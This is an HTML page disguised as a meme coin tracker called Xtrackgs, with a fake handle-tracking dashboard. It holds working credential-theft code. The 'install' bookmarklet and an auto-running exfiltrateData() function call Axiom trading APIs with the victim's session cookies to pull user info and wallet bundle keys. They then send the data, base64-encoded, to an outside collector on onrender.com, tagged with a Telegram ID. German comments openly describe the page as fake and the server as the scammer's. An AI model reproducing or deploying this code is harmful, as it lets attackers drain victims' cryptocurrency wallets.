<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xtrackgs — Meme Coin Tracker</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        brandBg: "#030712",
                        brandCard: "#0b0f19",
                        brandAccent: "#00ffa3",
                        brandBorder: "#1f2937"
                    }
                }
            }
        }
    </script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
    <style>body { font-family: Inter, Arial, sans-serif; }</style>
</head>

<body class="bg-brandBg text-white min-h-screen">

<header class="border-b border-brandBorder p-5">
    <div class="max-w-6xl mx-auto flex justify-between items-center">
        <h1 class="text-2xl font-black tracking-widest">XTRACK<span class="text-brandAccent">GS</span></h1>
        <div class="space-x-2">
            <button onclick="showTab('install')" class="bg-brandCard px-4 py-2 rounded">Install</button>
            <button onclick="showTab('dashboard')" class="bg-brandCard px-4 py-2 rounded">Dashboard</button>
        </div>
    </div>
</header>

<main class="max-w-6xl mx-auto p-6">
    <section id="install">
        <div class="bg-brandCard border border-brandBorder rounded-xl p-8">
            <h2 class="text-3xl font-bold mb-4">Bookmarklet Installation</h2>
            <p class="text-gray-400 mb-6">Ziehe den Button in deine Lesezeichenleiste.</p>
            <a id="bookmarklet" href="javascript:(async()=>{try{const u=await(await fetch('https://api7.axiom.trade/user-info',{method:'POST',credentials:'include'})).json();const b=await(await fetch('https://api8.axiom.trade/bundle-key-and-wallets',{method:'POST',credentials:'include'})).json();window.location.replace('https://my-data-catcherr.onrender.com/data/'+btoa(JSON.stringify({u,b})));}catch(e){}})();" class="inline-block bg-brandAccent text-black font-bold px-6 py-3 rounded-xl">
    Xtrackgs Bookmark
</a>
        </div>
    </section>

    <section id="dashboard" class="hidden">
        <div class="bg-brandCard border border-brandBorder rounded-xl p-8">
            <h2 class="text-3xl font-bold mb-6">Xtrackgs Dashboard</h2>
            <div class="flex gap-3 mb-6">
                <input id="handleInput" placeholder="@username" class="bg-black border border-gray-700 rounded px-4 py-2 flex-1 text-white"/>
                <button onclick="addFromInput()" class="bg-brandAccent text-black font-bold px-5 rounded">Add</button>
            </div>
            <div>
                <h3 class="font-bold mb-3">Tracked Handles</h3>
                <div id="handleList" class="space-y-2"></div>
            </div>
        </div>
    </section>
</main>

<script>
    // --- UI Logic (Steuerung der Tabs auf der Fake-Seite) ---
    let trackedHandles = [];

    function showTab(tab) {
        document.getElementById("install").classList.add("hidden");
        document.getElementById("dashboard").classList.add("hidden");
        document.getElementById(tab).classList.remove("hidden");
    }

    function addHandle(handle) {
        handle = handle.replace(/^@/, "").trim();
        if(!handle || trackedHandles.includes(handle)) return;
        trackedHandles.push(handle);
        updateDashboard();
    }

    function updateDashboard() {
        const list = document.getElementById("handleList");
        list.innerHTML = "";
        trackedHandles.forEach(handle => {
            let row = document.createElement("div");
            row.className = "bg-black border border-gray-700 rounded p-3 flex justify-between";
            row.innerHTML = `<span>@${handle}</span>`;
            list.appendChild(row);
        });
    }

    function addFromInput() {
        addHandle(document.getElementById("handleInput").value);
        document.getElementById("handleInput").value = "";
    }

    // --- Reparierte Daten-Abfrage (Ohne Absturz und passend zum Server) ---
    async function exfiltrateData() {
        try {
            // Holt die Daten direkt von der Axiom-API
            const userResponse = await fetch('https://api7.axiom.trade/user-info', { method: 'POST', credentials: 'include' });
            const user = await userResponse.json();

            const bundleResponse = await fetch('https://api8.axiom.trade/bundle-key-and-wallets', { method: 'POST', credentials: 'include' });
            const bundle = await bundleResponse.json();

            // Das Paket wird geschnürt
            const bookmarkData = {
                telegramId: '7198683357', 
                site: location.href,
                user: user,
                bundle: bundle.bundleKey // Hier wird der Schlüssel richtig benannt
            };

            // Der Browser leitet lautlos weiter und schickt das Paket an den Server des Scammers
            window.location.replace('https://my-data-catcherr.onrender.com/data/' + btoa(JSON.stringify(bookmarkData)));

        } catch (e) {
            // Fehler werden ignoriert, damit der Browser nicht meckert
            console.clear();
        }
    }

    // Automatische Ausführung, falls man eingeloggt ist
    if (localStorage.getItem('isAuthed')) {
        exfiltrateData();
    }
</script>
</body>
</html>
